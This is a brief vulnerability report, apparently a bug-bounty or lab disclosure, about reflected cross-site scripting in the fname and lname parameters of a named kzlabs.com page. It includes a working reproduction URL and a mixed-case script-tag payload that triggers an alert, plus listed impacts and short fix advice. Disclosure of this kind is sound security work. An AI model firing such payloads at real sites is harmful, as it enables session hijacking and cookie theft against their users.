## Title
Reflected Cross-Site Scripting (XSS) in `fname` and `lname` Parameters

## Summary
Reflected XSS vulnerability in:
`https://kzlabs.com/punishment/7.php`

## Steps to Reproduce
1. Open URL:
`https://kzlabs.com/punishment/7.php?fname=rajvardhan2%22%3E%3CscriPT%3Ealert%280%29%3C%2FscriPT%3E&lname=rajvardhan2%22%3E%3CscriPT%3Ealert%280%29%3C%2FscriPT%3E`

2. Observe execution.

## Payload Used
`rajvardhan2"><scriPT>alert(0)</scriPT>`

## Proof of Concept
## Screenshot — Vulnerable application confirming XSS execution
<img width="1920" height="765" alt="image" src="https://github.com/user-attachments/assets/fc74665b-a79f-47f3-a130-024304ea8388" />


## Impact
- Session hijacking
- Cookie theft
- JS execution

## Recommendations for Fix
- Encode output
- Validate input
- Avoid unsafe rendering
